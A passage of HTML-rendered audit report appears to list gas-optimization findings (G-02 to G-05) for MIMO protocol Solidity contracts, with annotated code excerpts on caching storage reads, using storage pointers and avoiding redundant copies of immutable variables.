class=\"mtk12\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span></code></pre>\n<ul>\n<li>contracts/actions/automated/MIMOAutoRebalance.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">108</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CALLER_NOT_LENDING_POOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">129</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span></code></pre>\n<ul>\n<li>contracts/actions/managed/MIMOManagedRebalance.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">108</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">109</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CALLER_NOT_LENDING_POOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">130</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span></code></pre>\n<ul>\n<li>contracts/proxy/MIMOProxy.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">56</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">//@audit gas: SLOAD (owner), this is important here as it impacts both the happy and sad paths</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">62</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">EXECUTION_NOT_AUTHORIZED</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">selector</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (owner)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">72</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD (owner)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">82</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owner_</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">//@audit gas: SLOAD (owner)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">83</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">OWNER_CHANGED</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (owner)</span></span></span></code></pre>\n<h2 id=\"g-02-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#g-02-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"g 02 multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>Caching a mapping’s value in a local <code>storage</code> or <code>calldata</code> variable when the value is accessed multiple times saves <strong>~42 gas per access</strong> due to not having to perform the same offset calculation every time.</p>\n<p>Affected code:</p>\n<ul>\n<li><code>MIMOEmptyVault.sol#executeOperation()</code>: <code>amounts[0]</code></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMOEmptyVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeOperation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64:     </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">81:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">82:     </span><span class=\"mtk10\">vaultCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\">(</span><span class=\"mtk10\">mimoProxy</span><span class=\"mtk1\">), </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<ul>\n<li><code>MIMOLeverage.sol#executeOperation()</code>: <code>amounts[0]</code></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMOLeverage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeOperation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">69:     </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">70:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">86:     </span><span class=\"mtk10\">asset</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\">(</span><span class=\"mtk10\">mimoProxy</span><span class=\"mtk1\">), </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">flashloanRepayAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">premiums</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li><code>MIMORebalance.sol#executeOperation()</code>: <code>amounts[0]</code></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMORebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeOperation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64:     </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">84:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">85:     </span><span class=\"mtk10\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\">(</span><span class=\"mtk10\">mimoProxy</span><span class=\"mtk1\">), </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<ul>\n<li><code>MIMOAutoRebalance.sol#executeOperation()</code>: <code>amounts[0]</code></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMOAutoRebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">090</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeOperation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">091:     </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">092:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">112:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">113:     </span><span class=\"mtk10\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\">(</span><span class=\"mtk10\">mimoProxy</span><span class=\"mtk1\">), </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">flashloanRepayAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">premiums</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li><code>MIMOManagedRebalance.sol#executeOperation()</code>: <code>amounts[0]</code></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMOManagedRebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">091</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeOperation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">092:     </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">093:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">113:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">114:     </span><span class=\"mtk10\">fromCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk10\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\">(</span><span class=\"mtk10\">mimoProxy</span><span class=\"mtk1\">), </span><span class=\"mtk10\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">flashloanRepayAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">premiums</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<h2 id=\"g-03-use-of-the-memory-keyword-when-storage-should-be-used\" style=\"position:relative;\"><a href=\"#g-03-use-of-the-memory-keyword-when-storage-should-be-used\" aria-label=\"g 03 use of the memory keyword when storage should be used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Use of the <code>memory</code> keyword when <code>storage</code> should be used</h2>\n<p>When copying a state struct in memory, there are as many SLOADs and MSTOREs as there are slots. When reading the whole struct multiple times is not needed, it’s better to actually only read the relevant field(s). When only some of the fields are read several times, these particular values should be cached instead of the whole state struct.</p>\n<p>Consider using a <code>storage</code> pointer instead of <code>memory</code> location here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: DexAddressProvider.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">51:   function getDex(uint256 index) external view override returns (address, address) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 52:     Dex memory dex = _dexMapping[index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 52:     Dex storage dex = _dexMapping[index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">53:     return (dex.proxy, dex.router);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">54:   }</span></span></span></code></pre>\n<h2 id=\"g-04-unnecessary-memory-operations-with-an-immutable-variable\" style=\"position:relative;\"><a href=\"#g-04-unnecessary-memory-operations-with-an-immutable-variable\" aria-label=\"g 04 unnecessary memory operations with an immutable variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Unnecessary memory operations with an <code>immutable</code> variable</h2>\n<p><code>immutable</code> variables aren’t storage variable, their instances get replaced in the code with their value. This caching operation is unnecessary here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MIMOVaultActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">depositAndBorrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">66:     </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk10\">collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">67:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">depositAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">68:     </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">borrowAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:   ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">IVaultsCore</span><span class=\"mtk1\"> </span><span class=\"mtk12\">core_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">core</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: unnecessary MSTORE as core is immutable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core_</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit gas: unnecessary MLOAD as core is immutable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">core_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">depositAndBorrow</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrowAmount</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit gas: unnecessary MLOAD as core is immutable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h2 id=\"g-05-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g-05-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g 05 the result of a function call should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] The result of a function call should be cached rather than re-calling the function</h2>\n<p>External calls are expensive. Consider using the already existing cached value for the following:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: MIMOManagedRebalance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">50:   function 